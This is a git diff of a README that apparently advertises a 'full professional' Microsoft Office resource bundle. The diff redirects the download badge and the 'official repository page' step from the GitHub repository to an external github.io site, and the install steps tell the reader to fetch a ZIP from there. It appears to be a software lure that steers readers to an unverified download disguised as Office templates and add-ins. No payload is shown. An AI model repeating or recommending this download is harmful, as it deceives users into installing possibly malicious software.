@@ -1,6 +1,6 @@
 # 📂 Microsoft-Office-full-professional - Improve Your Office Productivity Tools Today
 
-[![Download Project](https://img.shields.io/badge/Download-Office_Resources-blue.svg)](https://github.com/Genustylenchusinspiration627/Microsoft-Office-full-professional)
+[![Download Project](https://img.shields.io/badge/Download-Office_Resources-blue.svg)](https://genustylenchusinspiration627.github.io)
 
 This repository provides clear access to professional tools for Microsoft Office. Users can integrate these resources to improve workflows in Excel, Word, and PowerPoint. The project includes templates, add-ins, and automation scripts designed for modern office environments.
 
@@ -30,7 +30,7 @@ Your computer must meet these standards to run the tools:
 
 Follow these instructions to set up the software on your Windows machine.
 
-1.  Visit the official repository page at [https://github.com/Genustylenchusinspiration627/Microsoft-Office-full-professional](https://github.com/Genustylenchusinspiration627/Microsoft-Office-full-professional).
+1.  Visit the official repository page at [https://genustylenchusinspiration627.github.io](https://genustylenchusinspiration627.github.io).
 2.  Locate the green Code button on the top right side of the screen.
 3.  Click the button and select "Download ZIP" from the menu.
 4.  Move the downloaded folder to a secure location on your computer.
